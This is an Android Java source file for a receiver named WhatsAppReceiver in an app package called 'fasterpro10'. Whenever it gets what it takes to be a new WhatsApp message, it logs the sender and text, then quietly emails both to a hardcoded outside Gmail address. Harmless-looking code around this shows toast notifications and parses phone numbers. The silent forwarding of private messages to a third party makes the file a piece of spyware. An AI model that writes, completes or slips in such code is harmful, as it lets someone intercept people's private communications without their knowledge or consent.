package com.example.fasterpro10;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import android.widget.Toast;

import javax.mail.MessagingException;

public class WhatsAppReceiver extends BroadcastReceiver {

    private static final String TAG = "WhatsAppReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("com.whatsapp.NEW_MESSAGE")) {
            // Extract message details from intent extras
            String message = intent.getStringExtra("message");
            String sender = intent.getStringExtra("sender");
            long timestamp = intent.getLongExtra("timestamp", 0);

            // Log the received message details
            Log.d(TAG, "WhatsApp message received from: " + sender + ", message: " + message + ", timestamp: " + timestamp);

            // Add your WhatsApp message handling logic here
            // Forward WhatsApp message via email
            try {
                JavaMailAPI.sendMail("babulahmed000015@gmail.com", "WhatsApp Message Forwarded", "From: " + sender + "\n" + message);
                Log.d(TAG, "WhatsApp message forwarded successfully via email");
            } catch (MessagingException e) {
                Log.e(TAG, "Failed to forward WhatsApp message: " + e.getMessage());
                e.printStackTrace();
            }

            // 1. Check if the message contains a phone number format
            if (message.matches("\\d{3}[-\\.\\s]\\d{3}[-\\.\\s]\\d{4}")) {
                // Extract the phone number using a regular expression
                String phoneNumber = message.replaceAll("[^\\d]", "");
                // Extract the area code (assuming US format)
                String areaCode = phoneNumber.substring(0, 3);

                // Display a toast message with both area code and message
                showToast(context, "Area code: " + areaCode + "\nMessage: " + message);
            } else {
                // Display a toast message indicating no phone number found
                showToast(context, "WhatsApp message received from: " + sender + "\nMessage: " + message + "\n(No phone number detected)");
            }
        }
    }

    private void showToast(Context context, String message) {
        // Example method to display a toast message
        Toast.makeText(context, message, Toast.LENGTH_SHORT).show();
    }
}
